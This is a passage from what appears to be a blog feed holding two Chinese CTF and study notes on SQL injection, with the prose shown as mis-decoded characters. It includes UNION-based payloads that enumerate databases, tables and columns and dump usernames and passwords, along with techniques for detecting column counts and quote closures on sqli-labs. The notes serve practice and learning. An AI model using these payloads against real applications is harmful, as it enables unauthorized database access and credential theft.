    <content type="html"><![CDATA[<h1 id="SQL-çˆ†åº“åè¡¨ååˆ—åæ•°æ®å°ç»“"><a href="#SQL-çˆ†åº“åè¡¨ååˆ—åæ•°æ®å°ç»“" class="headerlink" title="SQL çˆ†åº“åè¡¨ååˆ—åæ•°æ®å°ç»“"></a>SQL çˆ†åº“åè¡¨ååˆ—åæ•°æ®å°ç»“</h1><p>æœ¬ç¯‡ä»¥ BUUCTF-[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL 1 ä¸ºä¾‹ï¼Œä½†ä¸æ¶‰åŠè¯¥é¢˜è¯¦ç»†å†…å®¹</p><p>é¢˜ä¸­æ¶‰åŠåˆ°åŒå†™ç»•è¿‡å…³é”®å­—è¿‡æ»¤ï¼Œåœ¨ä»¥ä¸‹ä¸åšè€ƒè™‘ï¼Œä»…å€Ÿç”¨æœ¬é¢˜åœºæ™¯</p><p>1.é€šè¿‡ <code>order by</code> åˆ¤æ–­å¾—å‡ºæ•°æ®è¡¨ä¸º 3 åˆ—ï¼Œå¹¶æµ‹è¯•å¾—å›æ˜¾ 2ã€3</p><p>2.è·å–æ‰€æœ‰åº“å <code>1&#39; union select 1,database(),group_concat(schema_name) from information_schema.schemata #</code> å¾—åˆ° geek ä»¥åŠ information_schema,mysql,performance_schema,test,ctf,geek</p><p>3.è·å– geek åº“ä¸­çš„è¡¨å <code>1&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39; #</code> å¾—åˆ° b4bsql,geekuser</p><p>4.è·å– geekuser ä¸­çš„åˆ—å <code>1&#39; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#39;geekuser&#39; #</code> å¾—åˆ° id,username,password</p><p>5.è·å–æ•°æ® <code>1&#39; union select 1,2,group_concat(concat_ws(0x7e,username,password)) from geek.geekuser #</code> å…¶ä¸­ <code>concat_ws()</code> å‡½æ•°çš„åŠŸèƒ½æ˜¯æŒ‡å®šå‚æ•°ä¹‹é—´çš„åˆ†éš”ç¬¦ï¼Œ<code>0x7e</code> å³ä¸º <code>~</code>ï¼Œéå¿…é¡»ï¼Œfrom åçš„æ ¼å¼ä¸ºâ€œåº“å.è¡¨åâ€</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/xiaobai141/p/14160758.html">https://www.cnblogs.com/xiaobai141/p/14160758.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL å­¦ä¹ ç¬”è®°</title>
    <link href="/2024/09/07/SQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/09/07/SQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL-å­¦ä¹ ç¬”è®°"><a href="#SQL-å­¦ä¹ ç¬”è®°" class="headerlink" title="SQL å­¦ä¹ ç¬”è®°"></a>SQL å­¦ä¹ ç¬”è®°</h1><h1 id="SQL-å­¦ä¹ ç¬”è®°-1"><a href="#SQL-å­¦ä¹ ç¬”è®°-1" class="headerlink" title="SQL å­¦ä¹ ç¬”è®°"></a>SQL å­¦ä¹ ç¬”è®°</h1><p>æœ¬ç¯‡ç¬”è®°å†…å®¹ä¸ B ç«™è¯¾ç¨‹ <a href="https://www.bilibili.com/video/BV1c34y1h7So?spm_id_from=333.1245.0.0">SQL æ³¨å…¥ç”±ç®€å…¥ç²¾</a>åŸºæœ¬ä¸€è‡´ï¼Œä¸ºçŸ¥è¯†ç‚¹å’Œä¸ªäººå¿ƒå¾—æ€»ç»“ã€‚</p><h1 id="sqli-labs-é¶åœºæ­å»º"><a href="#sqli-labs-é¶åœºæ­å»º" class="headerlink" title="sqli-labs é¶åœºæ­å»º"></a>sqli-labs é¶åœºæ­å»º</h1><ol><li>ä¸‹è½½ phpstudy</li><li>github ä¸Šä¸‹è½½ sqli-labs ç¯å¢ƒå¤åˆ¶åˆ° phpstudy æ ¹ç›®å½•ä¸‹</li></ol><h1 id="SQL-åŸºç¡€å¸¸ç”¨è¯­æ³•è¯­å¥"><a href="#SQL-åŸºç¡€å¸¸ç”¨è¯­æ³•è¯­å¥" class="headerlink" title="SQL åŸºç¡€å¸¸ç”¨è¯­æ³•è¯­å¥"></a>SQL åŸºç¡€å¸¸ç”¨è¯­æ³•è¯­å¥</h1><h2 id="å¢åˆ æ”¹"><a href="#å¢åˆ æ”¹" class="headerlink" title="å¢åˆ æ”¹"></a>å¢åˆ æ”¹</h2><h3 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h3><p><code>show databases;</code></p><p>ï¼ˆæ ¹ç›®å½•ä¸‹è¾“å…¥ï¼‰æŸ¥çœ‹æ•°æ®åº“</p><p><code>create database employees charset utf8;</code></p><p>åˆ›å»ºæ•°æ®åº“ employees å¹¶é€‰æ‹©å­—ç¬¦é›†</p><p><code>drop database employees;</code></p><p>åˆ é™¤æ•°æ®åº“ employees</p><p><code>use employees;</code></p><p>é€‰æ‹©è¿›å…¥æ•°æ®åº“ employees</p><h3 id="æ•°æ®è¡¨"><a href="#æ•°æ®è¡¨" class="headerlink" title="æ•°æ®è¡¨"></a>æ•°æ®è¡¨</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> employee<br>(<br>id <span class="hljs-type">int</span>,<br><span class="hljs-type">name</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">40</span>),<br>sex <span class="hljs-type">char</span>(<span class="hljs-number">4</span>),<br>birthday data,<br>job <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>)<br>);<br></code></pre></td></tr></table></figure><p>åˆ›å»ºæ•°æ®è¡¨ employeeï¼Œå¿…é¡»è®¾å®šåˆ—</p><p><code>drop table employee;</code></p><p>åˆ é™¤æ•°æ®è¡¨</p><p><code>rename table employee to user;</code></p><p>ä¿®æ”¹æ•°æ®è¡¨åç§°ä¸º user</p><p><code>alter table user character set utf8;</code></p><p>ä¿®æ”¹å­—ç¬¦é›†</p><h3 id="æ•°æ®åˆ—å’Œæ•°æ®è¡Œ"><a href="#æ•°æ®åˆ—å’Œæ•°æ®è¡Œ" class="headerlink" title="æ•°æ®åˆ—å’Œæ•°æ®è¡Œ"></a>æ•°æ®åˆ—å’Œæ•°æ®è¡Œ</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">user</span><br>(<br>    id,<span class="hljs-type">name</span>,sex,birthday,job)<br><span class="hljs-keyword">values</span><br>(<br>    <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;ctfstu&#x27;</span>,<span class="hljs-string">&#x27;male&#x27;</span>,<span class="hljs-string">&#x27;1999-05-06&#x27;</span>,<span class="hljs-string">&#x27;IT&#x27;</span>)<br>;<br></code></pre></td></tr></table></figure><p>å†™å…¥å†…å®¹</p><p><code>alter table user add salary decimal(8,2);</code></p><p>å¢åŠ ä¸€åˆ—å†…å®¹ salaryï¼Œæœ€å¤§ 8 ä½ï¼Œå°æ•°ç‚¹åä¿ç•™ 2 ä½</p><p><code>update user set salary=5000;</code></p><p>ä¿®æ”¹æ‰€æœ‰å·¥èµ„ä¸º 5000</p><p><code>update user set name=&#39;benben&#39; where id=1;</code></p><p>ä¿®æ”¹ id&#x3D;1 çš„è¡Œ name ä¸º benben</p><p><code>update user set name=&#39;benben2&#39;,salary=3000 where id=1;</code></p><p>ä¿®æ”¹ id&#x3D;1 çš„è¡Œ name ä¸º benben2ï¼Œå·¥èµ„ä¸º 3000</p><p><code>alter table user drop salary;</code></p><p>åˆ é™¤æŒ‡å®šåˆ—</p><p><code>delete from user where job=&#39;IT&#39;;</code></p><p>åˆ é™¤æŒ‡å®šè¡Œ</p><p><code>delete from user;</code></p><p>åˆ é™¤è¡¨ä¸­æ‰€æœ‰æ•°æ®ï¼ˆä¸åˆ é™¤è¡¨çš„ç»“æ„ï¼‰</p><h2 id="æŸ¥"><a href="#æŸ¥" class="headerlink" title="æŸ¥"></a>æŸ¥</h2><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>åŸºç¡€æŸ¥è¯¢è¯ï¼š</p><p><code>select</code>ï¼Œ<code>from</code>ï¼Œ<code>where</code></p><p>æŸ¥è¯¢å‚æ•°æŒ‡ä»¤ï¼š</p><p><code>union</code>ï¼Œ<code>group by</code>ï¼Œ<code>order by</code>ï¼Œ<code>limit</code>ï¼Œ<code>and</code>ï¼Œ<code>or</code></p><p>å¸¸ç”¨å‡½æ•°ï¼š</p><p><code>group_concat()</code>ï¼Œ<code>database()</code>ï¼Œ<code>version()</code></p><h3 id="åŸºæœ¬è¯­å¥"><a href="#åŸºæœ¬è¯­å¥" class="headerlink" title="åŸºæœ¬è¯­å¥"></a>åŸºæœ¬è¯­å¥</h3><p><code>select * from user where id=1;</code></p><p>select+ åˆ—åï¼ˆ*ä»£è¡¨æ‰€æœ‰ï¼‰+from+ è¡¨åï¼ˆuserï¼‰+where+ æ¡ä»¶è¯­å¥ï¼ˆid&#x3D;1ï¼‰+;</p><p><code>select * from user where id in (&#39;1&#39;);</code></p><p>åœ¨ user è¡¨ä¸­æŸ¥è¯¢æ‰€æœ‰åŒ…å« id ä¸º 1 çš„æ•°æ®</p><p><code>select * from user where id=(select id from user where username=(&#39;admin&#39;));</code></p><p>å­æŸ¥è¯¢ï¼Œä¼˜å…ˆæ‰§è¡Œ()å†…è¯­å¥</p><h3 id="æŸ¥è¯¢å‚æ•°æŒ‡ä»¤"><a href="#æŸ¥è¯¢å‚æ•°æŒ‡ä»¤" class="headerlink" title="æŸ¥è¯¢å‚æ•°æŒ‡ä»¤"></a>æŸ¥è¯¢å‚æ•°æŒ‡ä»¤</h3><h4 id="union"><a href="#union" class="headerlink" title="union"></a>union</h4><p><code>select id from user union select email_id from emails;</code></p><p>æŸ¥è¯¢å¹¶åˆå¹¶æ•°æ®æ˜¾ç¤º</p><p><code>select * from user where id=6 union select * from emails where id=6;</code>ï¼ˆé”™è¯¯ç¤ºä¾‹ï¼‰</p><p>è¿”å› <code>ERROR: have a different number of columns</code> è”åˆæ³¨å…¥ union å·¦å³è¡¨æ ¼åˆ—æ•°å¿…é¡»ç›¸ç­‰ï¼Œæ­¤ä¾‹ user æœ‰ 3 åˆ—ï¼Œemails æœ‰ 2 åˆ—</p><p><code>select * from user where id=6 union select *,3 from emails where id=6;</code>ï¼ˆæ­£ç¡®ç¤ºä¾‹ï¼‰</p><p>ç”±äº union å³æ¯”å·¦å°‘ä¸€åˆ—ï¼Œå› æ­¤ç”¨ 3 ä½œä¸ºå¡«å……åˆ—ï¼Œä½¿å·¦å³åˆ—æ•°ç›¸ç­‰ï¼ŒæŸ¥è¯¢ç»“æœ emails éƒ¨åˆ†ç¬¬ä¸‰åˆ—æ•°æ®å³ä¸º 3</p><h4 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h4><p>æœ¬èº«å®ç°çš„æ˜¯åˆ†ç»„åŠŸèƒ½ä½†ä¹Ÿå¯ç”¨äºåˆ¤æ–­åˆ—æ•°ã€‚ç”±äºå­˜åœ¨ä¸€äº›é—®é¢˜ä¸æ¨èå¸¸ç”¨ï¼Œä¾‹å¦‚ï¼šuser è¡¨ä¸­æœ‰ä¸¤æ¡ç›¸åŒå§“åä¸åŒ id çš„æ•°æ®ï¼Œåªå¯¹ä¸€åˆ—åˆ†ç»„å¯ä»¥ï¼Œå¯¹å¤šåˆ—åˆ†ç»„ä¼šæŠ¥é”™ã€‚ä¸€äº›é˜²ç«å¢™è¿‡æ»¤å¯èƒ½ä¸ä¸¥æ ¼ï¼Œå¯ä»¥æ–¹ä¾¿åˆ©ç”¨ã€‚</p><p><code>select username from user group by username;</code></p><p>åœ¨ user è¡¨ä¸­æŸ¥è¯¢ username åˆ—ï¼ŒæŒ‰ username åˆ†ç»„è¾“å‡º</p><p><code>select username from user group by 1;</code></p><p>åŒä¸Šè¾“å‡ºï¼Œusername ä»…ä¸€åˆ—ï¼Œæœ¬å¥æŸ¥è¯¢æŒ‰ç¬¬ä¸€åˆ—åˆ†ç»„</p><p><code>select username from user group by 2;</code></p><p>æŠ¥é”™ï¼Œusername ä»…ä¸€åˆ—ï¼Œæœ¬å¥æŸ¥è¯¢æŒ‰ç¬¬äºŒåˆ—åˆ†ç»„ï¼Œä¸å­˜åœ¨ç¬¬äºŒåˆ—</p><p><code>select * from user group by 2;</code></p><p>æ­£å¸¸è¾“å‡ºï¼Œuser è¡¨ä¸‰åˆ—æ•°æ®ï¼ŒæŒ‰ user è¡¨å†…ç¬¬äºŒåˆ—åˆ†ç»„ã€‚</p><p>æƒ³è¦åˆ¤æ–­åˆ—æ•°åˆ™å¯ä»¥æ ¹æ®ä»¥ä¸ŠåŸç†ä» 2 å¼€å§‹ 3ã€4ã€5Â·Â·Â·Â·Â·Â·å¾€åå°è¯•ï¼Œå½“å‡ºç°æŠ¥é”™æ—¶çš„æ•°-1 å³ä¸ºåˆ—æ•°</p><p>å®é™… SQL æ³¨å…¥æ—¶ä½¿ç”¨äºŒåˆ†æ³•ï¼Œå…ˆå–ä¸€ä¸ªè¶³å¤Ÿå¤§ä¼šè¿”å›æŠ¥é”™çš„æ•°ï¼Œè€Œåä¸æ–­å–åŠï¼ˆä¸­é—´æ•°ï¼‰ï¼Œç›´åˆ°æ‰¾åˆ°è¾¹ç•Œã€‚</p><p>ä¾‹å¦‚ <code>select * from user where id=1 group by 10;</code> 10-&gt;5-&gt;3-&gt;4</p><h4 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h4><p>æœ¬èº«å®ç°çš„æ˜¯æ’åºï¼ŒåŒ group by å¯ç”¨äºåˆ¤æ–­åˆ—æ•°</p><p><code>select * from user order by id;</code></p><p>åœ¨ user è¡¨ä¸­æŒ‰ id å‡åºæ’åº</p><p><code>select * from user where username=&#39;Xiao Ming&#39; order by id;</code></p><p>å¯åœ¨ order by å‰åŠ å…¥ where æ¡ä»¶</p><p><code>select * from user where username=&#39;Xiao Ming&#39; order by id desc;</code></p><p>order by çš„æ’åºé»˜è®¤å‡åºï¼Œåœ¨åé¢åŠ  desc æ”¹ä¸ºé™åº</p><p><code>select * from user order by 1;</code></p><p>åŒ group by ä¸€æ ·å¯æŒ‰ç¬¬å‡ åˆ—æ’åºï¼Œåˆ¤æ–­åˆ—æ•°æ–¹æ³•åŒæ ·ç›¸ä¼¼</p><h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>é™åˆ¶è¾“å‡ºå†…å®¹æ•°é‡ï¼Œä¸€èˆ¬ç”¨äºæŠ¥é”™æ³¨å…¥ï¼Œé™æ•°æ˜¾ç¤ºæŠ¥é”™åé¦ˆä¿¡æ¯</p><p><code>select * from user limit 0,3;</code></p><p>é™åˆ¶ä¸ºä»ç¬¬ 1 è¡Œå¼€å§‹æ˜¾ç¤º 3 è¡Œï¼Œåœ¨è¿™é‡Œå®é™…çš„ç¬¬ä¸€è¡Œå°±æ˜¯å‘½ä»¤é‡Œçš„ç¬¬ 0 è¡Œ</p><p>å½“å›æ˜¾å†…å®¹æœ‰é™æƒ³æŸ¥çœ‹åŒä¸€çº§å…¶ä»–æ•°æ®æ—¶å¯ä»¥åœ¨è¯­å¥ååŠ ä¸Š <code>limit 0,1</code>ï¼Œ<code>limit1,1</code>ï¼Œ<code>limit2,1</code> ç­‰ç­‰</p><h4 id="and-or"><a href="#and-or" class="headerlink" title="and &amp; or"></a>and &amp; or</h4><p>å³â€œä¸â€å’Œâ€œæˆ–â€ã€‚é¢ç®—æ˜¯æ¯”è¾ƒé‡è¦ä½†ä¹Ÿæ²¡ä»€ä¹ˆå¥½è¯´çš„ã€‚</p><h3 id="å¸¸ç”¨å‡½æ•°"><a href="#å¸¸ç”¨å‡½æ•°" class="headerlink" title="å¸¸ç”¨å‡½æ•°"></a>å¸¸ç”¨å‡½æ•°</h3><h4 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h4><p>å°†å¤šè¡Œåˆå¹¶æ‹¼æ¥è‡³ä¸€è¡Œæ˜¾ç¤ºï¼ˆå¹¶ç”¨æŒ‡å®šåˆ†éš”ç¬¦åˆ†éš”ï¼‰ï¼Œåœ¨ union æ³¨å…¥åŠæŠ¥é”™æ³¨å…¥æ—¶ group_concat å°¤ä¸ºé‡è¦</p><p><code>select group_concat(id,username,password) from user;</code></p><p>å°† user è¡¨å†…çš„ idï¼Œusernameï¼Œpassword åˆå¹¶åœ¨ä¸€è¡Œè¾“å‡º</p><p>å½“é‡åˆ°é™åˆ¶å›æ˜¾æ•°é‡åªæœ‰ä¸€æ¡æ—¶ï¼Œå°±å¯ä»¥ç”¨ <code>group_concat()</code> è¾ƒæ–¹ä¾¿çš„ä¸€æ¬¡æ€§è·å¾—æ‰€æœ‰å†…å®¹ï¼Œä¾‹å¦‚ <code>group_concat(table_name)</code>ï¼Œæ¯” <code>limit</code> ä¸€æ¡ä¸€æ¡æŸ¥æ›´æ–¹ä¾¿ã€‚ä½†æ˜¯å¦‚æœæºç å½“ä¸­æ˜¾ç¤ºä½æ•°è®¾ç½®è¾ƒå°‘çš„è¯è¿™ç§æ–¹æ³•å°±å¯èƒ½å¯¼è‡´æ˜¾ç¤ºä¸å…¨ï¼Œç”¨ <code>limit</code> åˆ™æ›´åŠ ç¨³å¦¥</p><h4 id="concat"><a href="#concat" class="headerlink" title="concat()"></a>concat()</h4><p>æ•ˆæœä¸ group_concat()ç±»ä¼¼ï¼Œæ˜¯å°†ä»»æ„é•¿åº¦çš„å¤šä¸ªå­—ç¬¦ä¸²æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåœ¨æŠ¥é”™æ³¨å…¥æ—¶ä¹Ÿæ˜¯å°¤ä¸ºé‡è¦</p><h4 id="select-database"><a href="#select-database" class="headerlink" title="select database()"></a>select database()</h4><p>æŸ¥çœ‹å½“å‰æ•°æ®åº“åç§°</p><h4 id="select-version"><a href="#select-version" class="headerlink" title="select version()"></a>select version()</h4><p>æŸ¥çœ‹å½“å‰æ•°æ®åº“ç‰ˆæœ¬ï¼Œé˜²ç«å¢™ç»•è¿‡æ—¶ç”¨å¾—åˆ°ï¼Œæ–¹ä¾¿æ‰¾åˆ°å¯¹åº”ç‰ˆæœ¬çš„æ¼æ´</p><h1 id="SQL-æ³¨å…¥åŸºç¡€"><a href="#SQL-æ³¨å…¥åŸºç¡€" class="headerlink" title="SQL æ³¨å…¥åŸºç¡€"></a>SQL æ³¨å…¥åŸºç¡€</h1><h2 id="åŸºç¡€æ¦‚å¿µ"><a href="#åŸºç¡€æ¦‚å¿µ" class="headerlink" title="åŸºç¡€æ¦‚å¿µ"></a>åŸºç¡€æ¦‚å¿µ</h2><p>SQL æ³¨å…¥å°±æ˜¯é€šè¿‡æ„é€ ä¸€æ¡ç²¾å·§çš„ SQL å‘½ä»¤è¯­å¥æ¥æŸ¥è¯¢å¾—åˆ°æƒ³è¦çš„ä¿¡æ¯ã€‚</p><p>æ³¨å…¥ç‚¹å³å¯ä»¥å®ç°è¾“å…¥çš„åœ°æ–¹ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªè®¿é—®æ•°æ®åº“çš„è¿æ¥ã€‚</p><h2 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h2><p>æŒ‰æŸ¥è¯¢å­—æ®µåˆ†ï¼š</p><p>æ•°å­—å‹ï¼Œè¾“å…¥å‚æ•°ä¸ºæ•´å‹</p><p>å­—ç¬¦å‹ï¼Œè¾“å…¥å‚æ•°ä¸ºå­—ç¬¦ä¸²ï¼ˆè¢«å•å¼•å·é—­åˆï¼‰</p><p>æŒ‰æ³¨å…¥æ–¹æ³•åˆ†ï¼š<br>union æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥ã€å¸ƒå°”æ³¨å…¥ã€æ—¶é—´æ³¨å…¥</p><h2 id="åˆ¤æ–­æ–¹æ³•"><a href="#åˆ¤æ–­æ–¹æ³•" class="headerlink" title="åˆ¤æ–­æ–¹æ³•"></a>åˆ¤æ–­æ–¹æ³•</h2><h3 id="æ•°å­—å‹-or-å­—ç¬¦å‹ï¼Ÿ"><a href="#æ•°å­—å‹-or-å­—ç¬¦å‹ï¼Ÿ" class="headerlink" title="æ•°å­—å‹ or å­—ç¬¦å‹ï¼Ÿ"></a>æ•°å­—å‹ or å­—ç¬¦å‹ï¼Ÿ</h3><p>æ•°å­—å‹æäº¤å†…å®¹ä¸€èˆ¬ä¸ºæ•°å­—ï¼Œä½†<u>æ•°å­—ä¸ä¸€å®šæ˜¯æ•°å­—å‹</u>ï¼Œ<u>æ•°å­—å‹ä¸éœ€è¦é—­åˆç¬¦æ¥é—­åˆ</u></p><p>å­—ç¬¦å‹æäº¤å†…å®¹åˆ™éœ€è¦<u>é—­åˆç¬¦é—­åˆ</u></p><p>1.ä½¿ç”¨ <code>and 1=1</code> å’Œ <code>and 1=2</code> æ¥åˆ¤æ–­</p><p>å¦‚æœä¸ºæ•°å­—å‹ï¼Œå‰è€…ç…§å¸¸æ˜¾ç¤ºè¿”å›ä¿¡æ¯ï¼Œåè€…ä¸ä¼šæ˜¾ç¤ºï¼Œå› ä¸º 1 ä¸ 2 ä¸ç­‰</p><p>å¦‚æœä¸ºå­—ç¬¦å‹ï¼Œä¸¤è€…éƒ½èƒ½æ­£å¸¸æ˜¾ç¤ºä¿¡æ¯ï¼Œç›¸å½“äºè¾“å…¥å†…å®¹å‡è¢«å•å¼•å·åŒ…è£¹ï¼Œand ä¸ä½œä¸ºå‘½ä»¤æ‰§è¡Œ</p><p>2.ä½¿ç”¨(?id)<code>=2-1</code> æ¥åˆ¤æ–­</p><p>å¦‚æœä¸ºæ•°å­—å‹åˆ™è¿”å›çš„æ˜¯ <code>?id=1</code> çš„å†…å®¹</p><p>å¦‚æœä¸ºå­—ç¬¦å‹åˆ™æ— æ³•è®¡ç®—ï¼Œè¿”å›ä¸º <code>?id=2</code> çš„å†…å®¹</p><p>ä¸æ¨èç”¨ <code>+</code>ï¼Œå› ä¸º URL ç¼–ç é€šå¸¸ç”¨ <code>+</code> å’Œ <code>%20</code> ä»£æ›¿ç©ºæ ¼ï¼Œè§£ç æ—¶ç›¸åº”ä¼šè¢«è§£ç æˆç©ºæ ¼</p><h3 id="è‹¥å­—ç¬¦å‹åˆ™é—­åˆæ–¹å¼ï¼Ÿ"><a href="#è‹¥å­—ç¬¦å‹åˆ™é—­åˆæ–¹å¼ï¼Ÿ" class="headerlink" title="è‹¥å­—ç¬¦å‹åˆ™é—­åˆæ–¹å¼ï¼Ÿ"></a>è‹¥å­—ç¬¦å‹åˆ™é—­åˆæ–¹å¼ï¼Ÿ</h3><p>å¸¸è§é—­åˆæ–¹å¼ï¼š</p><p><code>&#39;</code>ã€<code>&quot;</code>ã€<code>&#39;)</code>ã€<code>&quot;)</code>ã€å…¶ä»–</p><p>1.è¾“å…¥ <code>?id=1&#39;&quot;</code>ï¼ŒæŠ¥é”™ä¸º <code>......near 1&#39;&quot;&#39;......</code>ï¼Œå¤šäº†ä¸€ä¸ª <code>&#39;</code> åˆ™é—­åˆç¬¦ä¸º <code>&#39;</code></p><p>2.è¾“å…¥ <code>?id=1&#39;&quot;</code>ï¼ŒæŠ¥é”™ä¸º <code>......near 1&#39;&quot;&quot;......</code>ï¼Œå¤šäº†ä¸€ä¸ª <code>&quot;</code> åˆ™é—­åˆç¬¦ä¸º <code>&quot;</code></p><p>3.è¾“å…¥ <code>?id=1&#39;&quot;</code>ï¼ŒæŠ¥é”™ä¸º <code>......near 1&#39;&quot;&#39;)......</code>ï¼Œå¤šäº†ä¸€ä¸ª <code>&#39;)</code> åˆ™é—­åˆç¬¦ä¸º <code>&#39;)</code></p><p>4.è¾“å…¥ <code>?id=1&#39;&quot;</code>ï¼ŒæŠ¥é”™ä¸º <code>......near 1&#39;&quot;&quot;)......</code>ï¼Œå¤šäº†ä¸€ä¸ª <code>&quot;)</code> åˆ™é—­åˆç¬¦ä¸º <code>&quot;)</code></p><p>å³å°è¯•è¾“å…¥å†…å®¹ä¸­çš„é—­åˆç¬¦ä¸è¾“å…¥å†…å®¹å‰çš„é—­åˆç¬¦é—­åˆï¼Œè¾“å…¥å†…å®¹ååŸæœ¬çš„é—­åˆç¬¦åˆ™ä¼šå˜å¾—å¤šä½™ï¼Œä»è€ŒæŠ¥é”™ï¼Œæˆ‘ä»¬æ ¹æ®æŠ¥é”™å¾—åˆ°å‘½ä»¤å½“ä¸­æ‰€ç”¨çš„é—­åˆç¬¦</p><p>é—­åˆçš„ä½œç”¨ï¼š</p><p>ç»“æŸå‰ä¸€æ®µæŸ¥è¯¢è¯­å¥ï¼Œåœ¨åé¢å¯åŠ å…¥å…¶ä»–è¯­å¥ï¼ŒæŸ¥è¯¢éœ€è¦çš„å‚æ•°</p><p>åé¢ä¸éœ€è¦çš„è¯­å¥å¯ä»¥ç”¨æ³¨é‡Šç¬¦ <code>--+</code>ï¼ˆæ­¤å¤„è·Ÿçš„ <code>+</code> å®é™…æ˜¯ä»£æ›¿ç©ºæ ¼ï¼Œé¿å…ç›´æ¥è¾“å…¥ç©ºæ ¼è¢«å¿½ç•¥ï¼Œä¹Ÿå¯ä»¥é€šè¿‡åœ¨ç©ºæ ¼åéšä¾¿åŠ ä¸Šä¸€äº›å†…å®¹é¿å…è¿™ä¸ªé—®é¢˜ï¼Œä¾‹å¦‚ <code>-- abc</code>ï¼‰ã€<code>#</code>ã€<code>%23</code> æ³¨é‡Šæ‰</p><h2 id="union-è”åˆæ³¨å…¥"><a href="#union-è”åˆæ³¨å…¥" class="headerlink" title="union è”åˆæ³¨å…¥"></a>union è”åˆæ³¨å…¥</h2><p>ç”¨äºŒåˆ†æ³•åˆ¤æ–­é»˜è®¤é¡µé¢æ•°æ®åˆ—æ•°é‡ï¼Œå‚è€ƒå‰é¢çš„ unionã€group byã€order by å†…å®¹ï¼Œå†ä½¿ç”¨è”åˆæ³¨å…¥è·å¾—ç›®æ ‡ç»“æœ</p><p>ä½†æ˜¯é¡µé¢åªèƒ½æ˜¾ç¤ºä¸€ä¸ªå†…å®¹ï¼Œunion åçš„è¯­å¥æŸ¥è¯¢çš„å†…å®¹æ˜¯ä¸æ˜¾ç¤ºçš„ï¼Œå› æ­¤ä¸ºäº†æ˜¾ç¤ºæƒ³è¦çš„å†…å®¹ï¼Œå¯ä»¥å°†å‰ä¸€å¥æŸ¥è¯¢çš„å†…å®¹æ”¹ä¸ºæ•°æ®åº“ä¸­åŸæœ¬ä¸å­˜åœ¨çš„æ•°æ®ï¼Œå¦‚ <code>id=-1</code>ï¼Œé‚£ä¹ˆå‰é¢ä¸€å¥æŸ¥è¯¢ä¸åˆ°ç»“æœå°±åªä¼šæ˜¾ç¤ºåé¢ä¸€å¥æŸ¥è¯¢çš„ç»“æœ</p><p>æ­¤å¤–å¹¶éæ¯ä¸€åˆ—çš„å†…å®¹éƒ½ä¼šå›æ˜¾ï¼Œè¦å…ˆåˆ¤æ–­ä¼šå›æ˜¾çš„æ˜¯å“ªäº›åˆ—ã€‚ä¾‹å¦‚ sqli-labs çš„ less-1ï¼Œæ³¨å…¥ <code>?id=-1&#39; union select 1,2,3--+</code>ï¼Œä¼šå›æ˜¾çš„æ˜¯ 2ã€3ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥äºŒä¸‰ä¸¤åˆ—ä½ç½®æ¢æˆå…¶ä»–æƒ³è¦çš„å†…å®¹ï¼Œä¾‹å¦‚ <code>?id=-1&#39; union select 1,version(),database()--+</code></p><p>æ³¨å…¥æ­¥éª¤ï¼š</p><p>1.æŸ¥æ‰¾æ³¨å…¥ç‚¹</p><p>2.åˆ¤æ–­å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹</p><p>3.è‹¥æ˜¯å­—ç¬¦å‹åˆ™æ‰¾åˆ°å…¶é—­åˆæ–¹å¼</p><p>4.åˆ¤æ–­æŸ¥è¯¢åˆ—æ•° group by&#x2F;order by</p><p>5.æŸ¥è¯¢å›æ˜¾ä½ç½®</p><p>è€Œåå¯å‚è€ƒè¿™ç¯‡å°ç»“æŸ¥è¯¢æ‰€éœ€ä¿¡æ¯</p><h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><p>æœ‰æ—¶å°è¯• union è”åˆæ³¨å…¥å‘ç°è¯­å¥æ­£ç¡®ä½†æ— 